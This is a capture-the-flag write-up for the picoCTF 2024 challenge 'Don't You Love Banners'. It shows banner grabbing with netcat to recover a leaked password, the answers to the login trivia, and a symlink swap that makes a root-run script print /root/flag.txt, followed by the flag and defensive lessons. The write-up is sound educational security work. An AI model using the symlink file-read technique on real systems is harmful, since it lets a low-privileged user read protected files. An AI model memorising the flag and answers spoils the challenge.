# picoCTF - Don't You Love Banners

**Category:** General Skills  
**Platform:** picoCTF 2024  
**Tools:** `nc` (netcat), SSH banner grabbing, symlink attack (arbitrary file read)  

---

## Recon

The challenge exposes two moving-target TCP ports (they rotate per connection/instance):

- A **login service** that prompts for a password and two security questions before dropping into a shell via `pty.spawn('su - player')`.
- A **second service** (the one hinted at in the challenge description as "leaking crucial information") that, on connection, immediately returns an SSH identification banner instead of a normal prompt:

```
$ nc xebec.cylabacademy.net 28549
SSH-2.0-OpenSSH_9.6p1 My_Passw@rd_@1234

Invalid SSH identification string.
```

This is a classic **banner grabbing** leak — the "SSH version string" has been tampered with to smuggle the login password directly inside it.

## Vulnerability / Investigation

With the leaked password in hand, authenticating to the login service required answering two follow-up trivia questions hardcoded into the server-side script:

- "What is the top cyber security conference in the world?" → `DEF CON`
- "Who was the first hacker known for phreaking?" → `John Draper`

Passing all three checks drops the connection into a shell as the `player` user via `pty.spawn`. From there, `/root/script.py` was world-readable and revealed the full server logic:

```python
try:
    with open("/home/player/banner", "r") as f:
        print(f.read())
except:
    print("*** DEFAULT BANNER ***")
...
request = input("what is the password? \n").upper()
```

The key insight: this script is **executed as root** (it has to be, since it later runs `su - player` to drop privileges). Before any authentication happens, it opens and prints whatever is at `/home/player/banner` — **as root**, following symlinks.

`/root/flag.txt` was confirmed unreadable directly as `player`:
```
player@challenge:~$ cat /root/flag.txt
cat: /root/flag.txt: Permission denied
```

But since the root-owned process reads the banner file *before* dropping to the `player` user, swapping that file for a symlink to the protected flag causes root's own process to read it on our behalf.

## Exploit / Extraction

```
player@challenge:~$ rm banner
player@challenge:~$ ln -s /root/flag.txt banner
```

Reconnecting to the login service triggers the script (as root) to print the contents of `/home/player/banner`, which now resolves to `/root/flag.txt`:

```
$ nc xebec.cylabacademy.net 21667
academy{b4nn3r_gr4bb1n9_su((3sfu11y_d3ce8df1}

what is the password?
```

**Flag:** `academy{b4nn3r_gr4bb1n9_su((3sfu11y_d3ce8df1}`

## Lessons Learned

- Banners (SSH version strings, MOTD/welcome text) are an easy and often-overlooked place to leak secrets — always grab and inspect them on every exposed port, not just the "real" one.
- Any file a **root-owned process** reads and echoes back, if that file sits in a path writable by a lower-privileged user, is a prime target for a **symlink swap** to read otherwise-protected files. The privilege check needs to happen *before* the read, not just before the shell is handed over.
- A world-readable server-side script (`/root/script.py`) was effectively free source-code disclosure — always check file permissions on scripts you can see, not just data files.
